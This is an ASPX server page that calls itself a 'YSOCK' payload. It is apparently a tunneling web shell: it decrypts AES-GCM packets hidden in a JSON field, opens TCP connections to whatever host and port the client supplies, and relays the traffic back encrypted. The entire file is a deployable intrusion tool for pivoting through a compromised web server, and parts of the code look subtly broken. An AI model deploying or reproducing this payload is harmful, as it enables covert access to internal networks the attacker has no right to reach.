<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Collections.Concurrent" %>
<script runat="server">
// YSOCK Protocol v1 - ASPX Payload
// 替换下面的 KEY 为你的加密密钥（与客户端 -k 参数一致）
static string KEY = "CHANGE_ME";
static ConcurrentDictionary<int, Socket> sessions = new ConcurrentDictionary<int, Socket>();
static long counter = 0;

static byte[] DeriveKey(string k) {
    using (var sha = SHA256.Create()) return sha.ComputeHash(Encoding.UTF8.GetBytes(k));
}

static byte[] Decrypt(byte[] data, string k) {
    if (data.Length < 28) return null;
    var kb = DeriveKey(k);
    var nonce = new byte[12];
    Array.Copy(data, 0, nonce, 0, 12);
    var ct = new byte[data.Length - 12];
    Array.Copy(data, 12, ct, 0, ct.Length);
    using (var aes = new AesGcm(kb)) {
        var tag = new byte[16];
        var ctBody = new byte[ct.Length - 16];
        Array.Copy(ct, ct.Length - 16, tag, 0, 16);
        Array.Copy(ct, 0, ctBody, 0, ctBody.Length);
        var pt = new byte[ctBody.Length];
        aes.Decrypt(nonce, ctBody, tag, pt);
        return pt;
    }
}

static byte[] Encrypt(byte[] data, string k) {
    var kb = DeriveKey(k);
    long c = Interlocked.Increment(ref counter);
    using (var sha = SHA256.Create()) {
        var kb2 = sha.ComputeHash(kb);
        var cb = BitConverter.GetBytes(c);
        if (!BitConverter.IsLittleEndian) Array.Reverse(cb);
        var input = new byte[kb2.Length + cb.Length];
        Array.Copy(kb2, input, kb2.Length);
        Array.Copy(cb, 0, input, kb2.Length, cb.Length);
        var iv = sha.ComputeHash(input);
        var nonce = new byte[12];
        Array.Copy(iv, 0, nonce, 0, 12);
        using (var aes = new AesGcm(kb)) {
            var ct = new byte[data.Length];
            var tag = new byte[16];
            aes.Encrypt(nonce, data, ct, tag);
            var result = new byte[12 + ct.Length + tag.Length];
            Array.Copy(nonce, 0, result, 0, 12);
            Array.Copy(ct, 0, result, 12, ct.Length);
            Array.Copy(tag, 0, result, 12 + ct.Length, tag.Length);
            return result;
        }
    }
}

static byte[] MkPkt(byte flag, int sid, int seq, int ack, byte[] data) {
    using (var ms = new MemoryStream()) {
        ms.WriteByte(flag);
        var b = BitConverter.GetBytes(sid); if (!BitConverter.IsLittleEndian) Array.Reverse(b); ms.Write(b, 0, 4);
        b = BitConverter.GetBytes(seq); if (!BitConverter.IsLittleEndian) Array.Reverse(b); ms.Write(b, 0, 4);
        b = BitConverter.GetBytes(ack); if (!BitConverter.IsLittleEndian) Array.Reverse(b); ms.Write(b, 0, 4);
        b = BitConverter.GetBytes(data.Length); if (!BitConverter.IsLittleEndian) Array.Reverse(b); ms.Write(b, 0, 4);
        if (data.Length > 0) ms.Write(data, 0, data.Length);
        return ms.ToArray();
    }
}

static byte[] ReadBE(byte[] buf, int off, int len) {
    var r = new byte[len];
    Array.Copy(buf, off, r, 0, len);
    if (BitConverter.IsLittleEndian && len > 1) Array.Reverse(r);
    return r;
}
</script>
<%
Response.ContentType = "application/json";
string reqData = "";
using (var sr = new StreamReader(Request.InputStream)) { reqData = sr.ReadToEnd(); }
if (string.IsNullOrEmpty(reqData)) { Response.Write("{\"d\":\"\"}"); return; }

var m = System.Text.RegularExpressions.Regex.Match(reqData, "\"d\"\\s*:\\s*\"([^\"]+)\"");
if (!m.Success) { Response.Write("{\"d\":\"\"}"); return; }
string b64 = m.Groups[1].Value;

byte[] enc = Convert.FromBase64String(b64);
byte[] raw = Decrypt(enc, KEY);
if (raw == null) { Response.Write("{\"d\":\"\"}"); return; }

int off = 0;
int cnt = BitConverter.ToUInt16(new byte[] { raw[1], raw[0] }, 0); off += 2;
var respPkts = new List<byte[]>();

for (int i = 0; i < cnt; i++) {
    byte flag = raw[off]; off++;
    int sid = BitConverter.ToInt32(ReadBE(raw, off, 4), 0); off += 4;
    int seq = BitConverter.ToInt32(ReadBE(raw, off, 4), 0); off += 4;
    int ack = BitConverter.ToInt32(ReadBE(raw, off, 4), 0); off += 4;
    int dlen = BitConverter.ToInt32(ReadBE(raw, off, 4), 0); off += 4;
    byte[] dd = new byte[dlen];
    if (dlen > 0) { Array.Copy(raw, off, dd, 0, dlen); off += dlen; }

    switch (flag & 0x0F) {
        case 0x01: // SYN
            int hlen = dd[0];
            string host = Encoding.UTF8.GetString(dd, 1, hlen);
            int port = (dd[1 + hlen] << 8) | dd[2 + hlen];
            try {
                var sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.Connect(host, port);
                sock.Blocking = false;
                sessions[sid] = sock;
                BeginRead(sock, sid);
                respPkts.Add(MkPkt(0x04, sid, 0, seq, new byte[0]));
            } catch { respPkts.Add(MkPkt(0x00, sid, 0, seq, new byte[0])); }
            break;
        case 0x02: // DATA
            Socket cs;
            if (sessions.TryGetValue(sid, out cs) && cs.Connected) {
                try { cs.Send(dd); } catch { sessions.TryRemove(sid, out cs); cs.Close(); }
            }
            respPkts.Add(MkPkt(0x04, sid, 0, seq, new byte[0]));
            break;
        case 0x08: // FIN
            Socket fs;
            if (sessions.TryRemove(sid, out fs)) { try { fs.Close(); } catch {} }
            break;
        case 0x03: // PING
            respPkts.Add(MkPkt(0x05, 0, 0, 0, new byte[0]));
            break;
    }
}

// 读取活跃连接数据
foreach (var kv in sessions) {
    if (kv.Value.Connected && kv.Value.Available > 0) {
        var buf = new byte[32768];
        int n = kv.Value.Receive(buf);
        if (n > 0) {
            var d = new byte[n]; Array.Copy(buf, d, n);
            respPkts.Add(MkPkt(0x02, kv.Key, 0, 0, d));
        }
    }
}

using (var ms = new MemoryStream()) {
    var cb = BitConverter.GetBytes((short)respPkts.Count);
    if (!BitConverter.IsLittleEndian) Array.Reverse(cb);
    ms.Write(cb, 0, 2);
    foreach (var p in respPkts) ms.Write(p, 0, p.Length);
    byte[] encResp = Encrypt(ms.ToArray(), KEY);
    Response.Write("{\"d\":\"" + Convert.ToBase64String(encResp) + "\"}");
}

void BeginRead(Socket sock, int sid) {
    var state = new { Buf = new byte[32768], Sid = sid, Sock = sock };
    try {
        sock.BeginReceive(state.Buf, 0, state.Buf.Length, SocketFlags.None, ar => {
            try {
                int n = sock.EndReceive(ar);
                if (n > 0) BeginRead(sock, sid);
                else { sessions.TryRemove(sid, out sock); sock.Close(); }
            } catch { sessions.TryRemove(sid, out sock); try { sock.Close(); } catch {} }
        }, null);
    } catch {}
}
%>
